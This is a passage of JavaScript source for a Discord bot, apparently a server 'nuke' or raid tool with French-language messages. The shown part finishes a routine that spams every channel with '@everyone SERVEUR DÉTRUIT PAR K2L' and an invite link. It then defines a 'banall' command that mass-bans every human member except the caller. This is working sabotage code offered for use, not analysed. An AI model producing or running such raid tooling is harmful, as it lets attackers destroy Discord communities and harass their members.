                                channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {})
                            );
                        }
                        await Promise.all(spamPromises);
                    }).catch(() => {})
                );
            }

            await Promise.all([...rolePromises, ...createPromises]);
        } catch (error) {
            console.error("Erreur Nuke :", error);
        }
    }

    if (command === 'banall') {
        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
        await message.reply("🔨 **[BANALL]** Expulsion et bannissement de masse en cours...");
        try {
            await message.guild.members.fetch();
            const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
            let banCount = 0;
            const banPromises = members.map(async member => {
                try {
                    await member.ban({ reason: 'Nuke / Raid banall' });
                    banCount++;
                } catch (err) {}
            });
            await Promise.all(banPromises);
            await message.channel.send(`✅ **[BANALL Terminé]** ${banCount} membre(s) banni(s).`);
        } catch (error) {
            message.channel.send("❌ Erreur lors du banall.");
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
